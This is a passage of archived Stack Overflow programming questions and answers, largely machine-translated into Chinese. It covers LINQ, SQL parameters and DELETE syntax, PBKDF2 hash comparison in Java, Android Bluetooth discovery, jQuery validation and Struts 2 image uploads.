这个问题很广泛，因为很多东西都被称为分析器，测量不同的东西，从内存分配到管道刷新。

部分问题是概念性的。例如，您（和其他人）说“某些功能的运行时间不正确”。术语“运行时”需要一个定义。它是指“所有调用的总运行时间”还是“每次调用的平均运行时间”？它是否包括被调用的函数？它是指 CPU 时间，还是挂钟经过的时间？这只是模糊思维的一个例子。

许多人有一个更深层次的概念问题。他们认为他们正在寻找“慢功能”。我不知道他们从哪里得到这个想法，可能是从班主任那里得到的。加速的机会并不局限于特定的功能，如果速度是目标，你不能忽视那些不这样做的机会。

此外，他们认为，只要他们在测量，这些测量的准确性就很重要。*它无助于发现速度错误。*

恕我直言，与其试图诊断分析器的缺点，不如 1)[*摒弃围绕该主题的所有神话*](https://stackoverflow.com/a/1779343/23771)，以及 2) 强调积极的一面并[了解什么*是*有效](https://stackoverflow.com/a/4390868/23771)的。

# asp.net - linq 查询生成不同的结果

> ID：16184387
> 
> 赞同：1
> 
> 时间：2013-04-24T05:56:54.763
> 
> 标签：asp.net, linq

我在 linq 查询表达式中有一个 linq 查询，在 lambda 表达式中有另一个，但两者都产生不同的结果，请告诉我查询之间的区别是什么

```
var result = from c in displayedCompanies
                     select new[] { Convert.ToString(c.CampusId), c.CampusName, c.CampusCode }; 
```

以上查询生成以下结果

`[["10","Ken Mazar Campus","01"],["20","Ken Kabul","02"]]`

```
var result = displayedCompanies.Select(c => new { c.CampusId, c.CampusName, c.CampusCode }); 
```

此查询生成以下结果

```
[{"CampusId":10,"CampusName":"Ken Mazar Campus","CampusCode":"01"},
      {"CampusId":20,"CampusName":"Ken Kabul","CampusCode":"02"}] 
```

在我将结果转换为 json 之后，将生成以下结果

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:23:12.037

```
select new[] { Convert.ToString(c.CampusId), c.CampusName, c.CampusCode } 
```

上面创建了一个包含 3 个元素的数组。结果，linq 查询返回一个数组数组

```
displayedCompanies.Select(c => new { c.CampusId, c.CampusName, c.CampusCode }); 
```

上面的查询创建了具有 3 个属性的 anyonymus 对象，即 CampusId、CampusName、CampusCode 等。当转换为 json 时，它会创建一个对象并因此返回一个对象数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:54:27.447

简而言之，您正在做这样的事情：

**linq 查询**

```
displayedCompanies
            .Select (c => new String[] { Convert.ToString (c.CampusId), c.CampusName}); 
```

它作为没有列名的数组结果返回，只是值​​。

**拉姆达表达式**

```
 displayedCompanies
             .Select (c => new {CampusId= c.CampusId, CampusName= c.CampusName}) 
```

这将返回列名。

# c# - How to retrieve data from one column refer to another two columns from the same table?

> ID：16184388
> 
> 赞同：1
> 
> 时间：2013-04-24T05:56:54.993
> 
> 标签：c#, asp.net, sql-server

I have a table name

> flight_info (flight_id, flight_no, depart_from, destination, depart_time, arrive_time)

Now I want to retrieve only

> flight_id on the basis of column depart_from and destination

I wrote the SQL as following:

```
string str = "SELECT fligth_id FROM flight_info WHERE  depart_from = @depart AND destination = @destination" 
```

While running, it's showing an error pointing `@depart` and `@destination`. Can you help me, How can I specify those scalar variable.?

I tried it..

```
SqlDataReader myReader;
string depart = myReader["depart_from"].ToString();
string destination = myReader["destination"].ToString(); 
```

But, it's not working. Help needed.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:05:36.510

您在查询中使用了参数，但没有指定它们。

试试这样；

```
using (SqlConnection connection = new SqlConnection(connectionString))
{
   connection.Open();
   using (SqlCommand command = new SqlCommand("SELECT fligth_id FROM flight_info WHERE  depart_from = @depart AND destination = @destination", connection))
   {
        command.Parameters.Add("@depart", depart);
        command.Parameters.Add("@destination", destination);
        SqlDataReader myReader = command.ExecuteReader();
        while (myReader.Read())
        {
           int fligth_id = reader.GetInt32(0);
        }
   }
} 
```

由于您的查询仅返回`fligth_id`列，因此您无法以这种方式访问`depart_from`​​和`destination`列。*逐一*`SqlDataReader`读取数据库行。

 *如果您在查询中返回其他列，例如；

```
SELECT fligth_id, depart_from, destination 
```

你可以用同样的方式阅读它们；

```
while (myReader.Read())
{
    int fligth_id = reader.GetInt32(0);
    string depart_from = reader.GetString(1);
    string destination = reader.GetString(2);
} 
```*

# java - When I test my program that hashes password using SecretKeyFactory it always returns passwords are not the same

> ID：16184389
> 
> 赞同：0
> 
> 时间：2013-04-24T05:57:01.473
> 
> 标签：java

In my code I try to hash a password using `PBKDF2WithHmacSHA1` instance of `SecretFactory`. (before that you will see that O generate random salt)

But when I try to test the program in a simple java project with two passwords that are the same it gives me a response that they are not the same. What may be the reason?

```
tatic byte[] salt = new byte[16];
public static String password = "peachy";
public static String newpassword = "peachy";

public static byte []storedpassword;

public static void main(String[] args) throws Exception {

    generateSalt();
    System.out.println("salt1:"+salt.toString());
    storedpassword=hash(password,salt);
    System.out.println(storedpassword.toString());
    boolean answer = check(newpassword, storedpassword);
    System.out.println(answer);

}
public static void generateSalt()
{
     Random randomno = new Random();
     randomno.nextBytes(salt);

}

private static byte[] hash(String password, byte[] salt) throws Exception   
{  
    SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 65536, 128);

    return f.generateSecret(spec).getEncoded();

}
public static boolean check(String givenPassword, byte[] storedPassword)
   throws Exception{
        System.out.println("salt2:"+salt.toString());
        byte[] hashOfInput = hash(givenPassword,salt);
        System.out.println(hashOfInput.toString());
        return hashOfInput.equals(storedPassword);
   }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:27:28.837

```
 return Arrays.equals(hashOfInput,storedPassword); 
```

你不能比较`byte[]`使用`.equals()`方法，使用上面的代码。您无法使用 .equals() 方法比较它们的原因是因为`byte[]`'s equals() 方法测试引用相等，而不是逻辑（每个字节都相同）相等。这是因为`byte[]`继承自`Object`，这就是`Object`类`equals()`方法的实现方式。

有关更多信息，请参阅[此问题](https://stackoverflow.com/questions/8392771/how-does-an-arrays-equal-method-work)和 Jon Skeet 的答案。

# linq - C# linq to entity An item with the same key has already been added

> ID：16184395
> 
> 赞同：2
> 
> 时间：2013-04-24T05:57:33.583
> 
> 标签：linq, dictionary

I'm trying to query some records from my database and convert the result into a Dictionary with string key and string value but continually gets the error "An item with the same key has already been added.".

this is my linq query:

```
var random = (from rec in db.tbl_generatedsampledetails
              where rec.genID == id
              select new
              {
                     rec.@operator,
                     rec.internalID
              }).ToDictionary(r => r.@operator, r => r.internalID); 
```

Thanks for the help! :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:05:47.913

首先检查您的 id 是否唯一。要在字典中添加内容，您需要唯一的键。我认为您的密钥不是唯一的。如果 internalID 在您的数据库中是唯一的，则编写下面给出的以下代码。

```
var random = (from rec in db.tbl_generatedsampledetails
                                                 where rec.genID == id
                                                 select new { rec.@operator, rec.internalID }).ToDictionary(r => r.internalID,r => r.@operator); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:13:12.750

尝试这个：

```
var randomDict = db.tbl_generatedsampledetails
                   .Where(detail => detail.genID == id)
                   .Select(detail => new { detail.internalID, detail.@operator })
                   .ToDictionary(det => det.internalID,
                                 det => det.@operator); 
```

# wso2 - 构建 wso2 内核 4.0.6 时出错

> ID：16184397
> 
> 赞同：0
> 
> 时间：2013-04-24T05:57:43.380
> 
> 标签：wso2, wso2esb, wso2carbon

在构建 wso2 内核 4.0.6 时，任何人都可以帮助解决此错误：

[错误] 无法在项目 axis2-transport-rabbitmq-amqp 上执行目标：无法解决

项目 org.apache.axis2:axis2-transport-rabbitmq-amqp:bundle 的依赖项：

1.1.0-wso2v9：在 wso2-中找不到工件 com.rabbitmq.wso2:amqp-client:jar:3.0.3.wso2v1-

maven2-repository ( [http://dist.wso2.org/maven2](http://dist.wso2.org/maven2) ) -> [帮助 1]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:56:52.973

您用于检查代码的 svn URL 是什么？为了构建碳内核 4.0.6，您应该查看[https://svn.wso2.org/repos/wso2/carbon/kernel/branches/4.0.0/patch-releases/4.0.6/](https://svn.wso2.org/repos/wso2/carbon/kernel/branches/4.0.0/patch-releases/4.0.6/)并构建。如果您还没有从这里结帐，请使用该位置。

# html - 是否可以在 html 模板中添加一个简单的动画并使其适用于所有移动设备？

> ID：16184401
> 
> 赞同：0
> 
> 时间：2013-04-24T05:57:54.733
> 
> 标签：html, css, animation

我想在徽标中创建一个带有简单动画的模板（例如发光灯或移动线条）。此 html 模板可通过电子邮件（如时事通讯）提交。有没有可能完成这样的事情。如果是这样，怎么做？（CSS3 过渡可以吗？或者我应该使用 jQuery 吗？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:25:57.453

您想在电子邮件模板中添加动画吗？如果是，它将无法正常工作。电子邮件非常特殊，因此与 Web 开发不同。

我看到的唯一方法是用你的动画创建一个 gif 图像并在电子邮件模板上添加链接。

编辑：而且我不太确定，该 gif 可在所有电子邮件客户端中使用。

# sql - sql中不允许删除*全部？

> ID：16184413
> 
> 赞同：-2
> 
> 时间：2013-04-24T05:58:42.403
> 
> 标签：sql

当我们想从我们使用的表中选择所有列时

```
select * from <table_name> 
```

然后在删除时我们使用

```
delete from <table_name> 
```

为什么不

```
delete * from <table_name> is allowed here? 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:02:29.473

当我们要删除一行而不是一列时使用删除

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:00:53.827

删除查询删除了一行，然后使用 * 是没有必要的。

在选择中，您可以选择一列或两列或所有列，但在删除中您可以删除行的所有列，然后 * 不是必需的，因为您不能删除一列

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:10:15.543

`DELETE`与列没有任何关系，而是与表的行有关。如果要删除某些列数据，则必须`UPDATE`选择选项。

```
UPDATE table_name SET <set value here> WHERE <condition> 
```

对于行，可以通过 using子句`DELETE`指定需要删除的行。`WHERE`

```
DELETE FROM table_name WHERE <condition> 
```

如果您必须删除所有行，您可以使用[TRUNCATE](http://msdn.microsoft.com/en-us/library/ms188249%28v=sql.105%29.aspx)选项，因为它被认为是删除所有行的快速、有效的方法。

```
TRUNCATE TABLE table_name 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T06:14:48.990

这里有几种看待它的方法。

在关系代数术语中，SELECT 语句是选择操作和项目操作的组合。选择操作选择关系元组的子集，项目操作改变元组的结构。每个关系代数运算都需要关系并产生关系。选择操作实际上是 SELECT 语句的 WHERE 子句；项目操作是列列表，SELECT和FROM之间的部分。因为投影与结果关系的结构有关，所以它不适用于删除，这不会产生结果关系，而是破坏性地从关系中删除元组。元组的结构无关紧要，只有选择它们的标准。因此，当 SELECT 映射到两个关系代数运算时，

您可以想出一种方法来使这种语法有意义，但它会违反 SQL 的 DQL/DML/DDL 区别。数据查询语言只包含 SELECT。DML 包含 INSERT、UPDATE 和 DELETE，它们更改表中的元组，但不更改表的结构。DDL 包含 CREATE 和 ALTER 语句，并且可以更改表的结构。我可以看到口译`DELETE * FROM table`也就是说，清除这些行的列中的值，但是我们如何知道 DELETE 是删除还是更新？如果我们将 * 视为“实际删除这些行”，而将列列表视为“不删除行，但将这些列设为 NULL”，那么我们正在为不太可能发生的情况创建简写，以及模糊 DELETE 和 UPDATE 之间的区别。从长远来看，添加上下文敏感性将使事情变得更加复杂。如果我们将列列表视为指定要删除的列，那么我们正在制定一个可以根据其使用方式执行 DDL 或 DML 的语句，从而模糊了与另一个方向的区别。如果您选择强制使用 * 但不接受列列表，则您

因此，这只是您接受的有关 SQL 的其中一件事情。当您更精通 SQL 时，它会更有意义。例如，我怀疑您认为 * 是 SELECT 中的固定语法，但实际上并非如此，它是列列表的简写。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T06:07:09.050

在 select 的上下文中，例如“ **select * from [table]** ”，字符*****代表所有列。因此，如果表由 X 列组成，则将检索 X 列中的所有值。该值稍后将被应用程序使用/显示在 SQL 客户端中。

在删除的上下文中，当我们要删除时，我们不需要获取存储在列中的信息，因此不需要 *。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-24T07:19:21.850

根据您的问题，您想要删除行。使用`truncate table <table_name>`而不是你想在你的问题中做什么。这将删除该表的所有行

# xml - 如何从命令行在 ant 中创建 phpcs.xml 文件

> ID：16184416
> 
> 赞同：0
> 
> 时间：2013-04-24T05:58:51.537
> 
> 标签：xml, maven, ant, codesniffer

您好，我想创建 phpcs.xml 文件。但我不确定这个文件是由 ant 还是由 codesniffer 创建的？创建 phpcs.xml 的原因是我想在我需要在 jenkins 中使用的 build.xml 文件中添加代码块。你能帮我创建这个文件吗？下面是我想在 build.xml 文件中添加的代码。

```
 <target name="phpcs" description="Find coding standard violations using CodeSniffer">
 <exec executable="phpcs" output="/dev/null">
 <arg value="--report=checkstyle" />
 <arg value="--report-file=${basedir}/build/logs/checkstyle.xml" />
 <arg value="--standard=${basedir}/build/phpcs.xml" />
 <arg path="${basedir}/src" />
 </exec>
 </target> 
```

# android - Android 上的蓝牙：StartDiscovery 不起作用。无法扫描设备

> ID：16184420
> 
> 赞同：2
> 
> 时间：2013-04-24T05:59:02.730
> 
> 标签：android, bluetooth

我是 android 新手，我正在制作一个具有蓝牙功能的应用程序。我可以设置蓝牙适配器，获取我自己的设备信息，但我无法使用 startdiscovery 来发现蓝牙设备。当我开始扫描时，它什么也不做。

我正在使用 onclicklistner 开始扫描：

```
 bt.setOnClickListener(new OnClickListener() {
           @Override
           public void onClick(View v) {
               if (!(bluetooth.isEnabled())) {
                   status = "Bluetooth is not Enabled.";
                   Toast.makeText(AddUser.this, status, Toast.LENGTH_LONG).show();
                   Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
                startActivityForResult(enableBtIntent, 1);

                }
                else
                {

                    scand();
                }

           } 
```

这是我在“public void onCreate”函数之后放置的 onActivityResult 函数：

```
 protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
    System.out.println(resultCode);
    if (resultCode ==  RESULT_CANCELED) {
        status="Error Enabling bluetooth";
        Toast.makeText(AddUser.this, status, Toast.LENGTH_LONG).show();
    } else {

            scand();
    }

} 
```

这是我的 scand 函数，我在其中调用了 startdiscovery：

```
 private void scand()
{

   bluetooth.startDiscovery(); 
   Log.d("itmes", ""+items.size());
   item1 = new String[items.size()];
   item1 = items.toArray(item1);
   AlertDialog.Builder builder = new AlertDialog.Builder(this);
   builder.setTitle("Choose a device");
   builder.setItems(item1, new DialogInterface.OnClickListener() {

       public void onClick(DialogInterface dialog, int item) {
            Toast.makeText(getApplicationContext(), item1[item], Toast.LENGTH_SHORT).show();

       }

    });

    AlertDialog alert = builder.create();

    alert.show();

} 
```

这是广播接收器：

```
 private final BroadcastReceiver mReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();

            if (BluetoothDevice.ACTION_FOUND.equals(action)) 
            {
                   Log.e("br", "--- device found ---");
                BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

               items.add(device.getName());
            }
          }
        }; 
```

在广播接收器的上述代码中，我试图将找到的设备名称放在字符串 ArrayList“items”中。

我在 oncreate 函数中注册广播接收器，如下所示：

```
filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);
   registerReceiver(mReceiver, filter); 
```

我在 androidmanifest 文件中设置了蓝牙权限。在上面的 scand 函数中，它应该显示已发现设备的列表，但它显示的是一个只有标题的空对话框。请告诉我如何正确使用 startdiscovery 和 broadcastreceiver 在 alertdialog 中显示结果。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2018-06-04T17:57:19.057

检查你有

```
 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> 
```

在你的清单中。

请参阅 [https://developer.android.com/reference/android/bluetooth/BluetoothDevice#ACTION_FOUND](https://developer.android.com/reference/android/bluetooth/BluetoothDevice#ACTION_FOUND)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T07:02:10.930

是异步的`startDiscovery()`，您不会在调用后立即收到结果。移动代码以显示对话框到一个函数，比如 public void showScanResult() 并在你的 onReceive 中调用它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-12T16:09:04.870

```
 discovery() {
     IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);
     this.registerReceiver(mReceiver, filter);
     // Register for broadcasts when discovery has finished
     filter = new IntentFilter(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
     this.registerReceiver(mReceiver, filter);

     // If we're already discovering, stop it
     if (mBluetoothAdapter.isDiscovering()) {
         mBluetoothAdapter.cancelDiscovery();
     }
     // Request discover from BluetoothAdapter
     mBluetoothAdapter.startDiscovery();
  } 
```

广播接收器：

```
 private final BroadcastReceiver mReceiver = new BroadcastReceiver() {
  @Override
  public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        // When discovery finds a device
        try {
            Broadcast=true;
            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                // Get the BluetoothDevice object from the Intent
                BluetoothDevice device = intent
                        .getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

                // If it's already paired, skip it, because it's been listed
                // already
                if (device.getBondState() !=BluetoothDevice.BOND_BONDED)    {

                    near_device.add(device.getAddress());

                // When discovery is finished, change the Activity title
            } else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED
                    .equals(action)) {
                scanResult();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

};

 scanresult()
    {

            mBluetoothAdapter.cancelDiscovery();
            receiverCheck = false;
            // Unregister broadcast listeners
            Home.this.unregisterReceiver(mReceiver);
          // near device arraylist contain all device mac address
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-29T16:26:48.567

好吧，在我看来，当您将数组 item1 设置为要在 AlertDialog 中显示的内容时，您是在告诉 Dialog 显示当时数组中的项目（一个空数组），这样您就不会看到任何元素。

我不确定您是否可以在这样做之后更新 item1 数组的内容并期望刷新 AlertDialog。我不认为这是这样工作的（但我从来没有尝试过，无论如何）。

我使用 ListView 和 Adapter 在我的应用程序中做了类似的事情，所以当您通过适配器添加项目时，ListView 会刷新（无论如何您都必须使用 adapter.notifyDataSetChanged()）：

```
protected ArrayList<BluetoothDevice> foundDevices 
                      = new ArrayList<BluetoothDevice>();
private ListView foundDevicesListView;
private ArrayAdapter<BluetoothDevice> adapter;

foundDevicesListView = (ListView) findViewById(R.id.foundDevicesListView);

adapter = new ArrayAdapter<BluetoothDevice>(this,
            android.R.layout.simple_list_item_1, foundDevices);
foundDevicesListView.setAdapter(adapter);
//
//  Initialization, etc ....

    BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();

            // When discovery finds a new device
            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                // Get the BluetoothDevice object from the Intent
                BluetoothDevice device= intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE));
                if (!foundDevices.contains(device)) {
                    foundDevices.add(device);
                    adapter.notifyDataSetChanged();
                }
            }

            // When discovery cycle finished
            if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED.equals(action)) {
                if(foundDevices==null || foundDevices.isEmpty()){
                    // Show not devices found message
                }
            }
        } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-11-18T08:12:12.087

***如果您的应用针对 Android 11（API 级别 30）或更低版本，请使用 ACCESS_FINE_LOCATION，这是必要的，在 Android 的开发人员中***

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> 
```

[![在此处输入图像描述](https://i.stack.imgur.com/sLws8.png)](https://i.stack.imgur.com/sLws8.png)

如果您的应用针对 API 级别 23 或更低，则必须在运行时检查权限和请求权限

```
if(checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
        discovery()
    } else {
        requestLocationPermissions()
    }

private fun discovery() {
    if (bluetoothAdapter == null) {
        //bluetooth can't work

    } else {
        if (bluetoothAdapter.isEnabled) {
            bluetoothAdapter.startDiscovery()
        } else {
            startBluetooth()
        }
    }
}

private fun startBluetooth() {
    val bluetoothIntent = Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE)
    startActivityForResult(bluetoothIntent, REQUET_ENABLE_BT)
}

override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    when(requestCode) {
        REQUET_ENABLE_BT -> {
            if (resultCode == RESULT_OK) {
                discovery()
            } else {
                Toast.makeText(baseContext, "bluetooth open failed", Toast.LENGTH_SHORT).show()
            }
        }
        else -> {
            super.onActivityResult(requestCode, resultCode, data)
        }
    }
} 
```

# jquery - 使用 JQuery 1.9 的 MVC 不显眼验证不起作用

> ID：16184421
> 
> 赞同：1
> 
> 时间：2013-04-24T05:59:02.947
> 
> 标签：jquery, asp.net-mvc, asp.net-mvc-4

我已经完成了这篇文章中描述的所有步骤：

[将 jQuery 更新到 1.9.0 后，Unobtrusive Ajax 停止工作](https://stackoverflow.com/questions/14391867/unobtrusive-ajax-stopped-working-after-update-jquery-to-1-9-0)

和这个：

[更新到 Jquery 1.9.0 时 jquery.unobtrusive-ajax 插件损坏](https://stackoverflow.com/questions/14405178/jquery-unobtrusive-ajax-plugin-broken-when-updating-to-jquery-1-9-0)

但是，我仍然在 (jquery.validate.unobtrusive.js) 的这一行收到了萤火虫警告

```
 $jQval.unobtrusive.parse(document); 
```

![在此处输入图像描述](https://i.stack.imgur.com/4DEfF.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:14:52.590

现在可以正常工作了。请让我知道这是否不正确，但从我所看到的情况来看，它工作正常。

jquery.validate.unobtrusive.js

209行从此：

```
 var $forms = $(selector)
            .parents("form")
            .andSelf()
            .add($(selector).find("form"))
            .filter("form"); 
```

第 209 行至此：

```
 var $forms = $(selector)
            .parents("form")
            .addBack()
            .add($(selector).find("form"))
            .filter("form"); 
```

第 43 行：

```
replace = container.attr("data-valmsg-replace") && $.parseJSON(container.attr("data-valmsg-replace")) !== false; 
```

第 73 行：

```
replace = container.attr("data-valmsg-replace") && $.parseJSON(container.attr("data-valmsg-replace")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:32:55.290

您的解决方案并不正确，并且您的修复程序可以完成工作，但我认为有关它的一些背景信息不会受到伤害。

请注意，导致警告的原因是[jQuery Migrate](https://github.com/jquery/jquery-migrate)插件。

它用于根据旧 jQuery 版本为代码提供向后兼容性。如果您不想收到有关已弃用功能以及如何将它们更新到当前标准的警告，您可以使用以下代码行禁用警告：

```
jQuery.migrateMute = true; 
```

请注意，这些警告仅发生在 jQuery Migrate 的开发版本中，因此如果您切换到 jquery migrate ( `jquery-migrate-1.0.0.min.js`) 的缩小版本，甚至不需要此行。

另请注意，您正在使用 jquery 文件的开发版本，在生产环境中您应该使用缩小版本，因此您的修复也需要在`jquery.validate.unobtrusive.min.js`.

总而言之：

*   如果您使用 jQuery Migrate 插件（您会这样做），则无需修复它。
*   可以禁用该警告。
*   该警告不会出现在生产环境中（如果使用了正确的脚本）。
*   无论如何，微软希望在 jquery.validate.unobtrusive 的下一个版本中修复它
*   如果您确实修复它，请确保您也在*缩小版本*中修复它。
*   修复它的唯一好处是您可以删除 jQuery Migrate 插件（我只建议您绝对确定您的应用程序中没有 javascript 取决于遗留的 jQuery 功能）。

# java - 如何使用 Struts 2 在数据库中插入图像 标签

> ID：16184424
> 
> 赞同：3
> 
> 时间：2013-04-24T05:59:14.120
> 
> 标签：java, mysql, jsp, file-upload, struts2

我想在 Struts 2 应用程序的数据库中插入图像；

我正在使用三个类：

1.  模型类
2.  DAO 类使用准备好的语句插入查询。
3.  动作类

在 JSP 中，我使用的是`<s:file>`tag 。

我的问题是：我需要使用什么类型的模型类私有变量？

在数据库中我使用`BLOB`类型来存储图像，对吗？如果没有请给我建议。

如何使用 Srtuts 2 在数据库中插入图像？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T06:50:23.917

为了将文件上传到 Struts 2，您已经在使用 Struts 2 FileUpload Interceptor 并且您只需要在您的操作或模型类中定义这些字段

```
public class UploadAction extends ActionSupport {
      private File file;
      private String contentType;
      private String filename;

      public void setUpload(File file) {
         this.file = file;
      }

      public void setUploadContentType(String contentType) {
         this.contentType = contentType;
      }

      public void setUploadFileName(String filename) {
         this.filename = filename;
      }

      public String execute() {
         //...
         return SUCCESS;
      }
 } 
```

您可以通过类似的方式将`File`数据转换为`byteArray`

```
IOUtils.toByteArray(InputStream input); 
```

并可以`Blob`通过类似的方式将其保存为数据库中

```
Blob blob = connection.createBlob();
blob.setBytes(1, bytes); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T13:06:49.863

使用[`fileUpload`拦截器](https://struts.apache.org/core-developers/file-upload-interceptor.html)`File`，当您提交包含`<s:file>`能够传输到服务器的标签和值数据的表单时，您可以将对象放入您的操作中。如果您的上传成功，那么您可以从本地存储读取服务器上的数据，`java.io.tempdir`即可用于设置本地存储的位置。然后你需要读取文件的内容

```
File file; //this is uploaded file

FileInputStream is = new FileInputStream(file);
byte[] data = new byte[is.available()];
is.read(data);
is.close(); 
```

然后你可以使用`java.sql.Blob`or `java.sql.Clob`type 写入数据保存在数据库中，类型应该对应于数据库字段类型，即BLOB代表blob，CLOB代表clob等。当你再次从db中检索数据时，相同的java sql类型将用于将数据转换回来。

现在您的问题是，如果您想将该值保留在要使用数据库数据填充的模型中，有两个选项：

1.  保持数据不变，即`java.sql.Blob`
2.  将其转换为`byte[]`

对于第二个选择，您需要`byte[] data = getBytes(File file)`打开一个流并从文件中读取数据，或者如果您已经`Blob`使用`blob.getBytes(pos, length)`.

在您处理流的第一个选择中，使用`Blob`s`setBinaryStream(pos)` 获取输出流以写入上传的文件数据，或`getBinaryStream()`从数据库中检索数据。

在大多数情况下，您应该使用第二个选择，直到您有足够的理由使用第一个。

[使用 JDBC API 将Blob](http://docs.oracle.com/javase/1.5.0/docs/guide/jdbc/blob.html)存储到数据库的示例，您可以找到[添加和检索 BLOB 对象](http://docs.oracle.com/javase/tutorial/jdbc/basics/blob.html#add_retrieve_blob)。

[Inserting Image in Database Table](http://www.roseindia.net/jdbc/jdbc-mysql/insert-image-in-mysql.shtml)也有很好的例子。

# c# - 管理和保护我的项目的最佳方式是什么

> ID：16184425
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:20.120
> 
> 标签：c#, project

我最近聘请了一位位于海外的新软件工程师。我位于美国。

该项目需要在 Visual Studio 中完成，并在 c# 中创建。

员工已签署承诺，他们将对项目保密，并且不会将其透露给第三方等。

我的问题是，鉴于员工在海外，管理项目的最佳方式是什么？是否有任何第三方应用程序可以提供帮助？

我应该让员工在组件中创建它还是应该向他发送整个 MVC 文件？

我看过编译文件，但它总是可以被逆向工程。我喜欢与员工建立透明、开放和专业的关系，让他知道我可以信任他，但也需要直接控制。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:23:56.297

给自己一个源代码控制实用程序，然后从那里开始。如果您有足够的资金，您可以研究类似 Microsoft 'Team Foundation Server' 之类的东西，您可以在 Azure 云中以相对较少的价格运行它（与购买您自己的现场服务器相比）。

否则，请考虑使用私人 Github 帐户之类的东西。

如果他的工作做得很好，他会定期签入（至少每天一次，*至少*）并提供良好的评论，这意味着在任何特定时刻您都可以查看版本控制历史记录并查看他当天签入的内容- 这可以让你安心。

使用 Team Foundation Server (TFS) 的一个优势是它附带了出色的项目管理工具，您作为企业主可以创建工作项和任务，他可以根据它们分配估计值，然后如果您使用当前流行的软件/项目管理技术您可以将这些任务分配给离散的迭代（“冲刺”），并以 2-4 周的时间块为他设定目标。在此处阅读有关[Scrum 方法](http://en.wikipedia.org/wiki/Scrum_%28development%29)的信息。

我并不是说那里没有其他好的项目管理工具（如 JIRA），但 TFS 是我最有经验的工具，它也是由 Microsoft 制造的。

我认为你需要的是一个好的项目管理框架，而软件已经有很多这样的框架，所以不要重新发明轮子。作为一名优秀的开发人员，他应该欣赏通过良好的敏捷方法进行管理的价值，更重要的是，它将让您始终对业务/您的老板负责。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:19:23.600

忽略信任问题的方面（这超出了我们可以在这里给出的任何答案的范围），您可能应该做两件事：

(1) 最重要的是：使用源代码控制系统。如果您没有 Visual Studio Team System（我怀疑您没有），您可以使用免费的。有几个可用的，但我推荐[GIT](http://git-scm.com/)和[Subversion](http://subversion.apache.org/)。其他人可能想推荐其他人。

(2) 为了让程序员能够访问您的源代码控制系统，您应该为他们设置一个 VPN 帐户。如何做到这一点超出了这个答案的范围。

或者，如果您不想使用 VPN，您可以设置一个 Google 帐户并使用 Google Drive 来共享数据。可以[将 GIT 设置为与 Google Drive 一起使用](http://www.iexplain.org/using-git-with-google-drive-a-tutorial/)。

您还可以[使用 RiouxSVN 进行免费的 Subversion 托管](http://riouxsvn.com/)。

除此之外，请确保您可以准确地指定您需要的内容，并密切关注签到！

# hibernate - Spring roo 一对多未排序

> ID：16184427
> 
> 赞同：0
> 
> 时间：2013-04-24T05:59:24.153
> 
> 标签：hibernate, sorting, spring-roo

Spring Roo 中默认的一对多关系有一个用于维护关系数据的 Set 变量。

```
public Set<MyChildObject> Parent.getChildren() {
    return this.children;
} 
```

当我尝试在我的 JSPX 文件中使用它时，数据未排序。

```
<c:forEach items="${parent.children}" var="item">
    <c:out value="${item.id}  " />
</c:forEach> 
```

在 JSPX 或 Domain 中对数据进行排序的更好、更简单的方法是什么？请提供一个工作示例。

* * *

## 回答 #1

> 赞同：0
> 
